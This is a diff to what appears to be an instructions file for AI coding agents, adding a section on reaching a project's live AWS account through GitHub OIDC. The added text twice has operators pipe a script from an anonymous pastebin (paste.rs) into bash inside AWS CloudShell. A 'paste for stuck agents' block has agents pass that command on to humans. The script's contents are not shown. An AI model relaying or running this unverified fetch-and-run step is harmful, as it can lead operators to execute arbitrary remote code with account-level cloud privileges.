@@ -277,6 +277,47 @@ Stop and request human action for:
 - acceptance of residual critical/high security risk;
 - any scope or architecture change that materially changes the approved plan.
 
+## Live AWS control plane (not CursorCloudAgent)
+
+- Cloud seats often have `NoCredentials` (BF-PRE-002 / BF-2026-010). **Expected.**
+- Do **not** block on `CURSOR_AWS_ASSUME_IAM_ROLE_ARN` / CursorCloudAgent.
+- Live ContinuityOps AWS = **GitHub OIDC → `continuityops-gha`** via
+  `.github/workflows/continuityops-terraform.yml` (account `283077380808`).
+- Do **not** use `landing-zone-lab.yml` / `project-a-lzlab-gha` for ContinuityOps.
+- Do **not** invent AWS access keys. Repo wiring alone is not enough — the
+  operator must CloudShell-bootstrap the role once with **this** repo’s
+  `repository_id` (`1301990908`), never aws-landing-zone-lab `1296742987`.
+- One-time role bootstrap (operator CloudShell):
+
+  ```bash
+  gh api repos/nathanielecon/ContinuityOps -q .id   # expect 1301990908
+  REPO_ID=1301990908 curl -fsSL https://paste.rs/gHlj9 | bash
+  # or: REPO_ID=1301990908 bash terraform/ci-bootstrap/bootstrap-oidc-cloudshell.sh
+  ```
+
+- Escalate plan/apply (after GitHub Environment `continuityops` exists):
+
+  ```bash
+  gh workflow run continuityops-terraform.yml \
+    --repo nathanielecon/ContinuityOps \
+    -f action=plan -f environment=staging
+  # after plan OK:
+  gh workflow run continuityops-terraform.yml \
+    --repo nathanielecon/ContinuityOps \
+    -f action=apply -f environment=staging
+  ```
+
+- Cloud Agent stays **repo-only**; prepare Terraform / open PRs; CI assumes the role.
+
+### Paste for stuck ContinuityOps agents
+
+```text
+ContinuityOps live AWS is GHA OIDC → continuityops-gha (continuityops-terraform.yml), not this Cloud VM and not CursorCloudAgent / project-a-lzlab-gha.
+NoCredentials here is expected. Operator CloudShell once:
+REPO_ID=1301990908 curl -fsSL https://paste.rs/gHlj9 | bash
+then create GitHub Environment continuityops and dispatch ContinuityOps Terraform plan. Continue repo-only in this seat.
+```
+
 ## Delivery invariants
 
 - Build once; promote an immutable digest. Tags are aliases, never identity.
@@ -329,3 +370,5 @@ Durable, non-obvious notes for future cloud agents working in this environment.
   committed renders (`docs/architecture/continuityops-architecture.{png,svg}`,
   `continuityops.drawio`) are valid and the drawio XML is well-formed.
 - **No secrets required** for planning/validation work in this environment.
+  Live AWS is **not** this seat: escalate via GHA OIDC → `continuityops-gha`
+  (see Live AWS control plane above). `NoCredentials` here is expected.
